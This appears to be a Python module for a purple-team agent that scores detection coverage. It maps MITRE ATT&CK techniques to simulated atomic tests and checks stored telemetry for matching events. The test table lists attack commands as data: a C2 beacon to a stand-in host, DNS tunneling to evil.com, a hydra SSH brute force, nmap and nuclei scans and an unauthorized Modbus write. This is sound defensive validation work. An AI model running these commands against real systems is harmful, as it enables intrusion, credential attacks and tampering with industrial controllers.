"""Purple-team validation.

Each atomic test names a technique and the detection we'd expect. In dry_run mode nothing is executed: a test counts
as DETECTED when the user's own telemetry already contains an event whose signature/category maps to that technique
(or a child sub-technique) via the MITRE keyword map. Results are deterministic and traceable to evidence events.
"""
from sqlalchemy import select

from app.models import SecurityEvent, ValidationRun, ValidationStep
from app.models.base import utcnow
from app.services.agents.base import BaseAgent
from app.services.mitre import map_signature_to_techniques

ATOMIC_TESTS = {
    "T1059": ("Command and Scripting Interpreter", [("PowerShell execution", "powershell.exe -NoProfile -Command Write-Output test", "Sigma: proc_creation_win_powershell_suspicious")]),
    "T1071": ("Application Layer Protocol", [("HTTP C2 beacon", "curl -s http://test-c2.local/beacon", "Suricata: ET MALWARE CnC Beacon"),
                                             ("DNS tunneling", "nslookup encoded-data.evil.com", "Suricata: ET DNS Long DNS Query")]),
    "T1110": ("Brute Force", [("SSH brute force", "hydra -l admin -P wordlist.txt ssh://target", "Sigma: net_connection_lnx_ssh_bruteforce")]),
    "T1190": ("Exploit Public-Facing Application", [("Web vulnerability scan", "nuclei -t cves/ -u http://target", "Suricata: ET SCAN nuclei scanner")]),
    "T1078": ("Valid Accounts", [("Credential stuffing", "curl -X POST /api/login -d user=admin", "Sigma: web_multiple_failed_logins")]),
    "T1021": ("Remote Services", [("Lateral movement via RDP", "mstsc /v:target-host", "Sigma: net_connection_win_rdp_to_uncommon_target")]),
    "T1046": ("Network Service Discovery", [("Port scan", "nmap -sV -p 1-1000 target", "Suricata: ET SCAN Nmap")]),
    "T1486": ("Data Encrypted for Impact", [("Ransomware encryption (dry run)", "python encrypt_test_files.py --dry-run", "YARA: ransomware_file_encryption_pattern")]),
    "T0855": ("Unauthorized Command Message", [("Unauthorized Modbus write", "modbus write_register target 40001 0", "Suricata: ET EXPLOIT Modbus TCP Unauthorized Write")]),
}


def covers(observed: str, wanted: str) -> bool:
    return observed == wanted or observed.startswith(wanted + ".")


class PurpleAgent(BaseAgent):
    agent_type = "purple"

    async def run(self, run_id: int) -> dict:
        vrun = (await self.db.execute(select(ValidationRun).where(
            ValidationRun.id == run_id, ValidationRun.user_id == self.user_id))).scalar_one_or_none()
        if not vrun:
            raise LookupError("Validation run not found")
        vrun.status, vrun.started_at = "running", utcnow()

        events = (await self.db.execute(select(SecurityEvent.id, SecurityEvent.signature, SecurityEvent.category)
                  .where(SecurityEvent.user_id == self.user_id))).all()
        observed: dict[str, list[int]] = {}
        for ev_id, sig, cat in events:
            for tech in map_signature_to_techniques(f"{sig or ''} {cat or ''}"):
                observed.setdefault(tech["id"], []).append(ev_id)

        tested = detected = 0
        for tech_id in vrun.mitre_techniques or []:
            name, tests = ATOMIC_TESTS.get(tech_id, (None, []))
            for test_name, command, expected in tests:
                evidence_ids = [i for t, ids in observed.items() if covers(t, tech_id) for i in ids][:10]
                hit = bool(evidence_ids)
                tested += 1
                detected += hit
                vrun.steps.append(ValidationStep(
                    step_number=tested, technique_id=tech_id, technique_name=name, test_name=test_name,
                    simulated=True, command=f"[SIMULATED] {command}", expected_detection=expected,
                    result="detected" if hit else "missed", evidence={"event_ids": evidence_ids}, executed_at=utcnow()))
        rate = round(detected / tested * 100, 1) if tested else 0
        vrun.results_summary = {"tested": tested, "detected": detected, "missed": tested - detected, "detection_rate": rate}
        vrun.status, vrun.completed_at = "completed", utcnow()
        await self.step("validate", f"{tested} tests, {detected} detected")
        return {"run_id": run_id, "status": "completed", "results": vrun.results_summary,
                "summary": f"Validated {tested} tests: {detected} detected ({rate}%)"}
